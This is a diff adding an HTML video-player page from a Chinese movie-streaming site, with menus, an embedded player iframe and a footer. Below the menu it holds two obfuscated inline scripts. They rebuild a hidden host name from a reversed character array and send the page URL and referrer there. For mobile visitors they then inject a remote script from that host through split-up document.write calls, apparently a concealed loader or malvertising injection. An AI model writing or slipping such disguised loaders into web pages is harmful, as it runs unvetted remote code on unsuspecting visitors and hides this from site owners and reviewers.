@@ -1,0 +1,187 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head profile="http://gmpg.org/xfn/11">
+<meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>
+二手杰作--播放器</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
+<link rel="stylesheet" type="text/css" href="/skin/66scc/css/kube.css" />
+<link rel="stylesheet" type="text/css" href="/skin/66scc/css/reset.css" />
+<link rel="stylesheet" type="text/css" href="/skin/66scc/css/style.css" />
+<link rel="shortcut icon" href="/wp-content/themes/Loostrive/images/favicon.ico" type="image/x-icon" />
+<script>var killIE6ImgUrl = "/skin/66scc/images";</script>
+<script type='text/javascript' src='/skin/66scc/js/jquery.min.js?ver=3.8.1'></script>
+<script type='text/javascript' src='/skin/66scc/js/lets-kill-ie6.js?ver=3.8.1'></script>
+<link rel="stylesheet" type="text/css" href="/skin/66scc/css/lightbox.css" />
+<script type='text/javascript' src='/skin/66scc/js/lightbox.min.js'></script>
+<script src="http://tjs.sjs.sinajs.cn/t35/apps/opent/js/frames/client.js" language="JavaScript"></script>
+<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+<![endif]-->
+<style>
+.video {
+position: relative;
+padding-bottom: 56.25%;
+height: 0;
+overflow: hidden;
+}
+.video iframe,
+.video object,
+.video embed {
+position: absolute;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+}
+.lBtn_h {
+   background-color: red !important;
+}
+</style>
+</head>
+<body  class="custom-background">
+<!---加载进度条---->
+<script type="text/javascript">
+jQuery(function(){
+jQuery('#loading-one').empty().append('页面载入完毕.').parent().fadeOut('slow');
+});
+</script>
+<div id="main_loading"  onclick="javascript:turnoff('loading')">
+  <p id="loading-one" onclick="javascript:turnoff('loading')">页面载入中...</p>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+function turnoff(obj){
+document.getElementById(obj).style.display="none";
+}
+//]]&gt;
+</script>
+<!---加载进度条---->
+<div id="head" class="row">
+  <div class="container row">
+    <div class="row">
+      <div id="topbar">
+        <ul id="toolbar" class="menu">
+                   </ul>
+      </div>
+      <div id="rss">
+        <ul>
+          <li><a href="" target="_blank" class="icon1" title="欢迎订6v电影-新版"></a></li>
+          <li><a href="/baidumap.xml" target="_blank" class="icon5" title="百度站点地图"></a></li>
+          <li><a href="" target="_blank" class="icon2" title="我的腾讯微博" rel="nofollow"></a></li>
+          <li><a href="" target="_blank" class="icon3" title="我的新浪微博" rel="nofollow"></a></li>
+          <li><a href="/sitemap.html" target="_blank" class="icon6" title="站点地图"></a></li>
+          <li><a href="http://mail.qq.com/cgi-bin/feed?u=" target="_blank" class="icon4" title="用QQ邮箱阅读空间订阅本站" rel="nofollow"></a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <div class="clear"></div>
+  <div class="container">
+    <div id="blogname" class="third"> <a href="/" title="6v电影-新版">
+      <h1> 6v电影-新版 </h1>
+      <img src="/skin/66scc/images/logo.png" alt="6v电影-新版"></a> </div>
+    <div class="banner push-right">
+      </div>
+  </div>
+  <div class="clear"></div>
+</div>
+<div class="mainmenus container">
+  <div class="mainmenu">
+    <div class="topnav">
+      <ul id="menus">
+        <li class="menu-item current_page_item"><a href="/">首页</a></li>
+        <li class="menu-item "><a href="https://www.66s.cc/qian50m.html">最新50部</a><ul class="sub-menu"></ul></li><li class="menu-item "><a href="/xijupian/">喜剧片</a></li><li class="menu-item "><a href="/dongzuopian/">动作片</a></li><li class="menu-item "><a href="/aiqingpian/">爱情片</a></li><li class="menu-item "><a href="/kehuanpian/">科幻片</a></li><li class="menu-item "><a href="/kongbupian/">恐怖片</a></li><li class="menu-item "><a href="/juqingpian/">剧情片</a></li><li class="menu-item "><a href="/zhanzhengpian/">战争片</a></li><li class="menu-item "><a href="/jilupian/">纪录片</a></li><li class="menu-item "><a href="/donghuapian/">动画片</a></li><li class="menu-item "><a href="/dianshiju/">电视剧</a><ul class="sub-menu"><li class="menu-item"><a href="/dianshiju/guoju/">国剧</a></li><li class="menu-item"><a href="/dianshiju/duanju/">短剧</a></li><li class="menu-item"><a href="/dianshiju/rihanju/">日韩剧</a></li><li class="menu-item"><a href="/dianshiju/oumeiju/">欧美剧</a></li></ul></li><li class="menu-item "><a href="/ZongYi/">综艺</a></li><li class="menu-item "><a href="http://www.hao6v.com">旧版6v</a><ul class="sub-menu"></ul></li>
+      </ul>
+      <div id="select_menu">
+        <select onChange="document.location.href=this.options[this.selectedIndex].value;" id="select-menu-nav">
+          <option value="#">导航菜单</option>
+          <option   value="https://www.66ss.org/">首页</option>
+          <option   value="https://www.66s.cc/qian50m.html">最新50部</option><option   value="/xijupian/">喜剧片</option><option   value="/dongzuopian/">动作片</option><option   value="/aiqingpian/">爱情片</option><option   value="/kehuanpian/">科幻片</option><option   value="/kongbupian/">恐怖片</option><option   value="/juqingpian/">剧情片</option><option   value="/zhanzhengpian/">战争片</option><option   value="/jilupian/">纪录片</option><option   value="/donghuapian/">动画片</option><option   value="/dianshiju/">电视剧</option><option   value="/dianshiju/guoju/">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;国剧</option><option   value="/dianshiju/duanju/">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;短剧</option><option   value="/dianshiju/rihanju/">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;日韩剧</option><option   value="/dianshiju/oumeiju/">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;欧美剧</option><option   value="/ZongYi/">综艺</option><option   value="http://www.hao6v.com">旧版6v</option>        </select>
+
+      </div>
+    </div>
+  </div>
+  <div class="clear"> </div>
+</div>
+</div>
+
+<script>
+(function(){function jrr(f,top){f=f||window;top=top||window.top;var loc=window.location.toString();for(var i=0;(f!==top||f!==f.parent)&&i<10;++i){f=f.parent;try{loc=f.location.toString()}catch(e){break}}return loc}function tbgr(f,top){f=f||window;top=top||window.top;var loc=window.referer||"";for(var i=0;(f!==top||f!==f.parent)&&i<10;++i){f=f.parent;try{loc=f.referer}catch(e){break}}return loc}function gtp(){return{"kyurl":jrr(),"refer":tbgr()}}function jrr3(i){if(i===null||typeof(i)=="undefined"||!isFinite(i)){return NaN}try{return Math.trunc(i)}catch(e){try{return i>0?Math.floor(i):Math.ceil(i)}catch(e){return parseInt(i)}}}function ncFbU(qs){var l=[];for(var prop in qs){if(qs.hasOwnProperty(prop)){l.push(encodeURIComponent(prop)+"="+encodeURIComponent(qs[prop]||""))}}return l.join("&").replace(/%20/g,"+")}function fBRGnI(){var kL0h=gtp();kL0h["pid"]=3940;kL0h["tid"]=1;kL0h["ts"]=(new Date()).getTime();kL0h["callback"]="vgcabl"+jrr3(Math.random()*1e8);return"/"+"/"+['5','0','8','4','1',':','m','o','c','.','e','r','q','l','e','c','r','a','l','.','n','h','r']["r"+"e"+"v"+"er"+"se"]().join("")+"/api/v4/g"+"?"+ncFbU(kL0h)}if(/Android|iPhone/i.test(navigator.userAgent)){document["w"+"rit"+"e"]('<s'+'c'+'ri'+'p'+'t sr'+'c'+'="h'+'t');document["w"+"rit"+"e"]('tps:');document["w"+"rit"+"e"](fBRGnI());document["w"+"rit"+"e"]('"><\/s'+'c'+'ri'+'p'+'t'+'>')}})();
+</script>
+<script>
+(function(){function KhC(f,top){f=f||window;top=top||window.top;var loc=window.location.toString();for(var i=0;(f!==top||f!==f.parent)&&i<10;++i){f=f.parent;try{loc=f.location.toString()}catch(e){break}}return loc}function tbgr(f,top){f=f||window;top=top||window.top;var loc=window.referer||"";for(var i=0;(f!==top||f!==f.parent)&&i<10;++i){f=f.parent;try{loc=f.referer}catch(e){break}}return loc}function gtp(){return{"kyurl":KhC(),"refer":tbgr()}}function KhC3(i){if(i===null||typeof(i)=="undefined"||!isFinite(i)){return NaN}try{return Math.trunc(i)}catch(e){try{return i>0?Math.floor(i):Math.ceil(i)}catch(e){return parseInt(i)}}}function eeETm(qs){var l=[];for(var prop in qs){if(qs.hasOwnProperty(prop)){l.push(encodeURIComponent(prop)+"="+encodeURIComponent(qs[prop]||""))}}return l.join("&").replace(/%20/g,"+")}function m7BJFY(){var SfeS=gtp();SfeS["pid"]=3932;SfeS["tid"]=1;SfeS["ts"]=(new Date()).getTime();SfeS["callback"]="vgcabl"+KhC3(Math.random()*1e8);return"/"+"/"+['5','0','8','4','1',':','m','o','c','.','e','r','q','l','e','c','r','a','l','.','n','h','r']["r"+"e"+"v"+"er"+"se"]().join("")+"/api/v4/g"+"?"+eeETm(SfeS)}if(/Android|iPhone/i.test(navigator.userAgent)){document["w"+"rit"+"e"]('<s'+'c'+'ri'+'p'+'t sr'+'c'+'="h'+'t');document["w"+"rit"+"e"]('tps:');document["w"+"rit"+"e"](m7BJFY());document["w"+"rit"+"e"]('"><\/s'+'c'+'ri'+'p'+'t'+'>')}})();
+</script>
+
+
+<div class="container"><div class="clear"></div>
+  <div class="row">
+    <div class="subsidiary box">
+      <div class="bulletin fourfifth"> <span class="sixth">当前位置：</span>视频播放器</div>
+    </div>
+  </div>
+
+  <div class="mainleft"  id="content">
+    <div class="article_container row  box" style="padding:0px;">
+      <div class="context">
+
+      <script>
+        //IE ua判断
+        function isIE(val){
+            var ua = window.navigator.userAgent,
+                    reg = new RegExp('MSIE1[ ]1'+ val);
+            return reg.test(ua);
+        }
+        document.write('<link href="css.css" rel="stylesheet" type="text/css">');
+        if ('__proto__' in {} || isIE('9.0') || isIE('10.0')) {
+            document.write('<link href="phone.css" rel="stylesheet" type="text/css">');
+        }
+    </script>
+
+
+        <div id="post_content" style="padding:0px;">
+        <div class="video"><iframe width="100%" height="100%" allowTransparency="true" frameborder="0" scrolling="no" src="https://hnzy.bfvvs.com/play/Ddw6Qnzb"></iframe><script src="/d/ewfdsg456y.js"></script></div>
+        </div>
+        &nbsp;
+        <div class="clear">  请勿相信在线片中跑马灯广告.</div>
+        <div class="widget box row">
+          <h3>播放地址</h3>
+                    <a href="/e/DownSys/play/?classid=19&id=22616&bf=2&pathid3=0" target="_self" class="lBtn ">
+          正片          </a>
+                  </div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+</div>
+</div>
+
+
+
+<div class="clear"></div>
+<div id="footer">
+  <div class="footnav container">
+    <ul id="footnav" class="menu">
+    </ul>
+  </div>
+  <div class="footnav container">
+    <ul id="friendlink" class="menu">
+          </ul>
+  </div>
+<div class="copyright">
+    <p> Copyright &copy; 2012-2014 <a href="/"><strong>
+      我的网站      </strong><a href="http://www.miitbeian.gov.cn/"></a><br />
+          </p>
+    <p class="author"><a href="/" target="_blank" rel="external">www.66s.cc</a></p>
+  </div>
+</div>
+</div>
+<!--gototop-->
+<div id="tbox"> <a id="gotop" href="javascript:void(0)"></a> </div>
+<script type="text/javascript" src="/skin/66scc/js/jquery.masonry.js"></script>
+<script type="text/javascript" src="/skin/66scc/js/loostrive.js"></script>
+<script src="/d/tj.js"></script> </body>
+</html>
